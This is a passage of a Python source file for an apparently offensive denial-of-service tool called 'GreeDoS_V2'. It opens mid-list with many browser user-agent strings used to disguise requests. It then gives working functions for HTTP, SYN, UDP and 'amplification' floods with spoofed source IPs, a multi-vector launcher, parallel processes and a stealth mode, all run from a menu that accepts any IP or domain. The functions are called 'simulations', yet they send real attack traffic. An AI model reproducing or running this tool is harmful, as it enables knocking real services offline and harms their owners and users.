         "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00F Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; I9192 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
 "Mozilla/5.0 (Linux; Android 4.2.2; GT-P5100 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.3; SM-G7102 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.136 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.2.2; Galaxy S4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.4.2; en-us; SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile",
 "Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-30.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo A369i Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.3; D2305 Build/18.0.A.1.30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; LG-D802 Build/KOT49I.D80220c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; vi-vn; mobiistar touch BEAN 402c Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; XT1080 Build/SU4.21) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16",
 "Mozilla/5.0 (Linux; U; Android 4.3; en-ca; HUAWEI G6-L11 Build/HuaweiG6-L11) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.1.2; LG-F160L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; SonyC1505 Build/11.3.A.2.23) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; th-th; HUAWEI Y511-U30 Build/HUAWEIY511-U30) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Series40; Nokia2700c/09.98; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27",
 "Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
 "Mozilla/5.0 (X11; Linux i686; rv:6.0.2) (Q7sip7ZS4Ba8FkDSOvRNleYM4KEG59V8+uT/RC1tW0U=) Gecko/20100101 Firefox/6.0.2",
 "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 925; ANZ892) like Gecko",
 "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 925; ANZ892) like Gecko",
 "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; ; CJPMS_AAPCA4157828C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.14 Safari/537.17",
 "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4",
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/38.0.2125.59 Mobile/12A365 Safari/600.1.4",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.99 Safari/537.22",
 "Mozilla/5.0 (iPod touch; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4",
 "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.7 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36 OPR/25.0.1614.50",
 "Mozilla/5.0 (X11; CrOS x86_64 6158.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.108 Safari/537.36",
 "Guzzle/4.2.3 curl/7.35.0 PHP/5.5.9-1ubuntu4.4",
 "curl/7.30.0",
 "Mozilla/5.0 (Linux ia32) node.js/0.10.32 v8/3.14.5.9",
 "Mozilla/5.0 (compatible; Googlebot/4.1; en-US rv:9.3.7) Firefox/32.5",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7)",
 "AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us)",
 "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)",
 "Gecko/20100101 Firefox/5.0.1",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) ",
 "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en)",
 "Presto/2.9.168 Version/11.50",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)",
 "Baiduspider+(+http://www.baidu.com/search/spider.htm)",
 "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
 "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
 "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/)",
 "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
 "zspider/0.9-dev http://feedback.redkolibri.com/",
 "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
 "TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
 "TheSuBot/0.2 (www.thesubot.de)",
 "FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
 "Mozilla/4.0 (compatible: FDSE robot)",
 "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable)",
 "Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable)",
 "Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
 "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
 "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
 "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
 "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
 "Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0)",
 "Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
 "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
 "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
 "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
 "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
 "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
 "NetResearchServer/4.0(loopimprovements.com/robot.html)",
 "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",
 "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET) ",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13)",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12"
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) "
"AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
"AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
"Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) "
"AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
"Presto/2.9.168 Version/11.50",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernel 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
]

    
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    return headers """



def resolve_target(target):
   
    try:
        ip = socket.gethostbyname(target)
        return ip
    except socket.gaierror as e:
        console.print(f"[bold red]Error: Unable to resolve {target} to an IP address. {e}[/bold red]")
        sys.exit(1)

def dynamic_ip():
    """Generate random IP address for spoofing."""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# simulation function for attacks
def simulate_http_flood(target, duration, thread_id, stealth=False):
   
    if not target.lower().startswith(("http://", "https://")):
        target = "http://" + target
        #target = "https://" + target 


    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        try:
            params = {"rand": random.randint(1000, 9999)}
            requests.get(target, headers=random_http_headers(), params=params, timeout=2)
            #requests.get(target, headers=random_https_headers(), params=params, timeout=3)
            count += 1
        except Exception:
            pass
        if not stealth:
            console.log(f"[HTTP Flood][Thread {thread_id}]: Request #{count} sent.")
    console.log(f"[HTTP Flood][Thread {thread_id}]: Completed with {count} requests.")

def simulate_syn_flood(target, duration, thread_id, stealth=False):
    """Simulate SYN Flood attack."""
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        dport = random.randint(1, 65535)
        packet = IP(dst=target, src=dynamic_ip()) / TCP(dport=dport, flags="S")
        try:
            send(packet, verbose=False)
            count += 1
        except Exception:
            pass
        if not stealth:
            console.log(f"[SYN Flood][Thread {thread_id}]: SYN packet #{count} sent to port {dport}.")
    console.log(f"[SYN Flood][Thread {thread_id}]: Completed with {count} packets.")

def simulate_udp_flood(target, duration, thread_id, stealth=False):
    """> UDP Flood attack."""
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        dport = random.randint(1, 65535)
        packet = IP(dst=target, src=dynamic_ip()) / UDP(dport=dport) / b"Payload"
        try:
            send(packet, verbose=False)
            count += 1
        except Exception:
            pass
        if not stealth:
            console.log(f"[UDP Flood][Thread {thread_id}]: UDP packet #{count} sent to port {dport}.")
    console.log(f"[UDP Flood][Thread {thread_id}]: Completed with {count} packets.")

def simulate_amplification_attack(target, duration, thread_id, stealth=False):
    """> Amplification Attack."""
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        dport = random.choice([53, 123, 1900])
        packet = IP(dst=target, src=dynamic_ip()) / UDP(dport=dport) / b"Amplification Payload"
        try:
            send(packet, verbose=False)
            count += 1
        except Exception:
            pass
        if not stealth:
            console.log(f"[Amplification][Thread {thread_id}]: Amplified packet #{count} sent to port {dport}.")
    console.log(f"[Amplification][Thread {thread_id}]: Completed with {count} packets.")

def simulate_high_speed_replay(pcap_file, interface, duration, stealth=False):
    """Replay packets using Tcpreplay."""
    end_time = time.time() + duration
    while time.time() < end_time:
        command = ["tcpreplay", "--intf1", interface, "--loop=0", pcap_file]
        try:
            if stealth:
                run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                run(command)
        except Exception as e:
            console.log(f"[red]Error with Tcpreplay: {e}[/red]")
            console.log(f"[red]if Tcpreplay is not installed then install this via, sudo apt install tcpreplay {e}[/red]")

            break
    console.log("[High-Speed Replay]: Completed.")

def simulate_multi_vector_attack(target, duration, threads, stealth=False):
    """> Multi-Vector Attack """
    console.log(f"[Multi-Vector]: Starting multi-vector attack on {target} for {duration} seconds.")
    sub_threads = max(1, threads // 4)
    thread_group = []

    for i in range(sub_threads):
        t = threading.Thread(target=simulate_http_flood, args=(target, duration, f"HTTP-{i+1}", stealth))
        t.start()
        thread_group.append(t)
    for i in range(sub_threads):
        t = threading.Thread(target=simulate_syn_flood, args=(target, duration, f"SYN-{i+1}", stealth))
        t.start()
        thread_group.append(t)
    for i in range(sub_threads):
        t = threading.Thread(target=simulate_udp_flood, args=(target, duration, f"UDP-{i+1}", stealth))
        t.start()
        thread_group.append(t)
    for i in range(sub_threads):
        t = threading.Thread(target=simulate_amplification_attack, args=(target, duration, f"AMP-{i+1}", stealth))
        t.start()
        thread_group.append(t)

    for t in thread_group:
        t.join()
    console.log("[Multi-Vector]: Multi-vector attack completed.")


def run_attack_in_parallel(attack_func, target, duration, num_processes, stealth=False):
    """Run attack functions in parallel using multiprocessing."""
    processes = []
    for i in range(num_processes):
        process = multiprocessing.Process(target=attack_func, args=(target, duration, i + 1, stealth))
        processes.append(process)
        process.start()
    for process in processes:
        process.join()

# Terminal Menu 
def main_menu():
    console.print(GreeDoS_LOGO, style="bold cyan", justify="center")
    console.print("[bold red]-------------------- Welcome to GreeDoS_V2 --------------------[/bold red]\n", justify="center")
    console.print("[bold blue]----------------------- Copyright 2025_MrEchoFi_EbwerBrothers ------------------------[/bold blue]\n", justify="center")
    
    target = console.input("[bold green]Enter IP or domain (e.g., http://example.com): [/bold green]").strip()
    target_ip = resolve_target(target)

    try:
        duration = int(console.input("[bold green]Enter duration (in seconds): [/bold green]"))
        num_processes = int(console.input("[bold green]Enter number of processes: [/bold green]"))
    except ValueError:
        console.print("[bold red]Invalid input. Please enter numeric values only.[/bold red]")
        return

    stealth = console.input("[bold blue]Enable stealth mode? (y/n): [/bold blue]").strip().lower() == "y"

    while True:
        console.print("\n[bold yellow]Choose an attack type to simulate:[/bold yellow]")
        console.print("[1] HTTP/HTTPs Flood (Realistic HTTP GET)")
        console.print("[2] SYN Flood (Protocol)")
        console.print("[3] UDP Flood (Volumetric)")
        console.print("[4] Amplification(Simulated)")
        console.print("[5] Multi-Vector (All types concurrently)")
        console.print("[6] High-Speed Packet Replay (Tcpreplay)")
        console.print("[7] Exit\n")

        try:
            choice = int(console.input("[bold green]Enter your choice (1-7): [/bold green]").strip())
        except ValueError:
            console.print("[bold red]Invalid input. Please try again.[/bold red]")
            continue

        if choice == 1:
            run_attack_in_parallel(simulate_http_flood, target_ip, duration, num_processes, stealth)
        elif choice == 2:
            run_attack_in_parallel(simulate_syn_flood, target_ip, duration, num_processes, stealth)
        elif choice == 3:
            run_attack_in_parallel(simulate_udp_flood, target_ip, duration, num_processes, stealth)
        elif choice == 4:
            run_attack_in_parallel(simulate_amplification_attack, target_ip, duration, num_processes, stealth)
        elif choice == 5:
            simulate_multi_vector_attack(target_ip, duration, num_processes, stealth)
        elif choice == 6:
            pcap_file = console.input("[bold green]Enter the path to a PCAP file for replay: [/bold green]").strip()
            interface = console.input("[bold green]Enter network interface (e.g., eth0): [/bold green]").strip()
            simulate_high_speed_replay(pcap_file, interface, duration, stealth)
        elif choice == 7:
            console.print("[bold red]Exiting GreeDoS. Stay safe![/bold red]")
            break
        else:
            console.print("[bold red]Invalid choice. Please select a valid option.[/bold red]")


if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        console.print("\n[bold red]GreeDoS terminated by user. Stay safe![/bold red]")
